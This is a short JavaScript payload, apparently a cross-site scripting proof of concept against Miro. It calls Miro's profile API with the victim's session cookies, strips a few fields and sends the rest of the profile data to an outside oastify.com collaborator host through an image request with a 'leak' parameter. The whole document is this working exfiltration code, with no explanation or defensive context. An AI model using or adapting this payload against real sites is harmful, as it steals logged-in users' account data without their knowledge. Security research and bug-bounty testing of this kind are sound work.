(() => {
  fetch("https://miro.com/api/v1/profile/", {
    method: "GET",
    credentials: "include"
  })
    .then(res => res.json())
    .then(profileData => {
      const {
        achievements,
        subscriptions,
        toolbarPlugins,
        interests,
        betaFeatures,
        ...slimProfileData
      } = profileData;
      const img = new Image();
      img.src = "u1wyjdfnobpaq7g0nb0zo6n0zr5it8hx.oastify.com?leak=" +
        encodeURIComponent(JSON.stringify(slimProfileData));
    })
    .catch(err => console.error("Profile fetch failed or blocked:", err));
})();
